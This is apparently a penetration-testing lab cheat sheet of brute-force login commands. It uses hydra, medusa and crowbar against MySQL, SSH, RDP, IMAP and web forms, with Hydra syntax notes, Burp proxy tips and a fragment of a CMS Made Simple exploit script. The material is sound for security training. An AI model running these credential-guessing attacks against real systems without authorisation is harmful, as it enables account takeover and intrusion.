## Brute Force mysql:
--> Note: if you have too many connections, my sql will usually time you out!!!!

```
hydra -t 1 -L usernames.txt -P password.txt 192.168.151.11 mysql
```

## Brute Force ssh:

```
hydra -l root -p admin -s 22222 192.168.151.96 -t 4 ssh
```

## Brute force http protected dir

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

## Brute Force RDP, VNC, SSH

```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```

## Brute Force with user and password lists RDP:

```
sudo crowbar -b rdp -s 10.11.1.222/32 -U userlist.txt -C pass.txt
```

## SSH attack with Hydra

```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

## Http post attack

```
 hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

## Http Authenticated Post Form Attack

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
```

## IMAP Brute Force

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
```

## Http Attacks (great detail)

```
https://github.com/gnebbia/hydra_notes
```


## Set Hydra to Point at Burp:
- This can help use burp to figure out if Hydra is sending the correct request

```
# Add
export HYDRA_PROXY=connect://127.0.0.1:8080

# Remove

unset HYDRA_PROXY

```

## Use Hydra to brute force a form from Burp Suite:

- Grab the form you want from Burp here is an example:

```
POST /j_spring_security_check HTTP/1.1
Host: pennyworth.htb:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pennyworth.htb:8080/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://pennyworth.htb:8080
Connection: close
Cookie: JSESSIONID.fe42cd9b=node01ws035f860g0jnuo80vq7lkyn1.node0
Upgrade-Insecure-Requests: 1

j_username=admin&j_password=admin&from=&Submit=Sign+in

```

- Reporduce In Hydra:

```
hydra -I -v -V -s 8080 -L ./user.txt -P pass.txt pennyworth.htb http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:H=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv%3a109.0) Gecko/20100101 Firefox/119.0:H=Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http%3a//pennyworth.htb%3a8080/login:H=Origin: http%3a//pennyworth.htb%3a8080:H=Upgrade-Insecure-Requests: 1:H=Cookie: JSESSIONID.fe42cd9b=node01ws035f860g0jnuo80vq7lkyn1.node0:S=loginError"


## Parameters:

I: Ignore Prvious Jobs
v: verbose
V: show password guesses
s: Port Number
L: User list file
l: user 
P: Password list file
p: password
pennyworth.htb : webserver name
http[s]-post-form : http[s] form attack, basically grab this from burp as seen above

## Inside url string:
format: URL Location:request body:Optional stuffs:Conditional
"H=" Added header item, note you can do this with cookies as well
"S=" Success string, this string will be in header/body of response to indicate a successful login
"F=" Fail String, if you don't want to use a success string, then use this,  this will indicate a string in header or body of respone that will indicate a failed login.

## NOTES

- Try to Use One user name at a time if possible, if you use a username list then you might miss successful passwords
- 302 Redirect Issue, on some forms when you login you get a 302 redirect to the login page, hydra does not always view this as a successful login since it doesn't seem to read redirect html body, to get around this if you see something like  this in your results when verbose is enabled:
**[VERBOSE] Page redirected to http[s]://pennyworth.htb:8080/**
That means your page was redirected, which could indicate a successful login. The key here is that if you only get one or a few of these after a hydra brute force, you may have the login you need so make sure you check for this. In order to get the password though you might have to do some analysis. For me I set the "F=" fail string to "S=" the sucess string and found the password that wasn't reported as sucessful.
```

- ![](pics/20231101173832.png)
- CMS Made Simple version 2.2.8

- Search Sploit:

```
parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
```

G00d j0b, keep up!

